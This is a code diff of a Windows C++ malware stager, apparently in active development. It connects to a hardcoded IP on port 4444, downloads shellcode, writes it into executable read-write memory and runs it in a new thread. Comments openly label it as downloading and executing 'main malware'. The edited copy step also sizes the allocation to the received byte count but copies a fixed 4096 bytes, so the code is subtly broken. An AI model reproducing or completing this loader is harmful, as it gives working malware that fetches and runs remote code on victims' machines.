@@ -20,7 +20,6 @@ bool Stager::run(const std::string& host, const std::string& port)
 {
     // manually resolve apis (skip for now and just include the headers that import it)
 
-    std::cout << "hi" << std::endl;
     // connect to server
     WSADATA wsaData;
     WSAStartup(MAKEWORD(2,2), &wsaData);
@@ -53,17 +52,20 @@ bool Stager::run(const std::string& host, const std::string& port)
     }
     freeaddrinfo(result);
 
+
     // download main malware
 
     //const unsigned int MAX_BEACON_SIZE = 500000;
 	std::vector<unsigned char> shellcode(4096);
 
     std::cout << "4" << std::endl;
-    recv(sock, (char*)shellcode.data(), shellcode.size(), 0);
+    //recv(sock, (char*)shellcode.data(), shellcode.size(), 0);
+    int bytes_received = recv(sock, (char*)shellcode.data(), shellcode.size(), 0);
     
     std::cout << "5" << std::endl;
     // allocate memory?
-    LPVOID beacon_mem = VirtualAlloc(0, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    //LPVOID beacon_mem = VirtualAlloc(0, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    LPVOID beacon_mem = VirtualAlloc(0, bytes_received, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     if (beacon_mem == NULL)
     {
         std::cout << "virtualalloc failed" << std::endl;
@@ -71,11 +73,13 @@ bool Stager::run(const std::string& host, const std::string& port)
     // TODO: this only recv when bytes recv is already over max?
     //recv(sock, (char*)beacon_mem, beacon_size, 0);
     
-
+    // COPY the received shellcode to executable memory
+    memcpy(beacon_mem, shellcode.data(), shellcode.size());
     std::cout << "6" << std::endl;
     // execute malware
-    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)beacon_mem, NULL, 0, NULL);
-    
+    HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)beacon_mem, NULL, 0, NULL);
+   
+    WaitForSingleObject(thread, INFINITE); // Wait for thread to complete
     std::cout << "7" << std::endl;
     // cleanup
     closesocket(sock);
@@ -87,8 +91,8 @@ bool Stager::run(const std::string& host, const std::string& port)
 int main()
 {
     Stager tcpStager;
-    //tcpStager.run("172.18.245.234", "4444");
-    tcpStager.run("10.0.0.48", "4444");
+    tcpStager.run("172.18.245.234", "4444");
+    //tcpStager.run("10.0.0.48", "4444");
 }
 
 
